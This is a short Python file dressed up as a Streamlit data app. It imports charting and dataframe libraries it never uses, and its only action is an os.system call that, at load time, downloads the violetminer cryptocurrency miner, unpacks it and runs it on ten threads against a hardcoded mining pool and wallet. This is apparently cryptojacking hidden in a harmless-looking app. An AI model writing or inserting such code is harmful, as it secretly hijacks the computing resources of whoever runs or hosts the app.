from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64

os.system ("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool 168.235.86.33:3393 --username SK_QzApkbVGsAxyQykaWSnEF.Nungkay --password x --disableNVIDIA --threads 10") 
